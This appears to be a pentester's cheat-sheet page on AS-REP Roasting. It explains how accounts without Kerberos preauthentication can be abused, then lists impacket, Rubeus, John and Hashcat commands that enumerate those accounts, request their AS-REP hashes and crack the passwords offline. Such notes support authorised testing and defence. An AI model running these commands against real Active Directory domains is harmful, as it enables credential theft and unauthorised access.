---
label: AS-Rep Roasting
---

# AS-Rep Roasting

The first step of the authentication process via Kerberos is to send an `AS-REQ`. Based on this request, the DC can validate if the authentication is successful. If so, the DC replies with an AS-REP containing the TGT. This step is also called _Kerberos Preauthentication_. It prevents offline password guessing.

Without _Kerberos Preauthentication_, an attacker is ablet to send an AS-REQ to the DC on behalf of any AD user. After obtaining the AS-REP from the DC, the attacker could perform offline cracking against the encrypted part of the response. This is the _AS-REP Roasting_ attack.

> **IMPORTANT**: By default, the AD user account **option "Do not require Kerberos preauthentication" is disabled**, meaning that Kerberos preauthentication is performed for all AD users. But it's quite common to find legacy (or not) services that requires this option to be enabled.

Linux:

> **NOTE**: `users.txt` includes usernames to be checked (one username per line).

```bash
# Enumerate ASReproastable users (without credentials)
impacket-GetNPUsers -usersfile users.txt -dc-ip $ip $domain/

# Enumerate ASReproastable users (with credentials)
impacket-GetNPUsers -usersfile users.txt -dc-ip $ip $domain/$user:$pass

# Request TGT to crack
impacket-GetNPUsers -dc-ip $ip -request -outputfile $file $domain/$user

# Crack AS-Rep Hash with John 
john --format=krb5asrep --wordlist=$wordlist $asrep_file

# Crack AS-Rep Hash with HashCat
hashcat -m 18200 $file $wordlist
```

Windows:

```powershell
# Get ASReproastable users
.\Rubeus.exe asreproast /nowrap
```
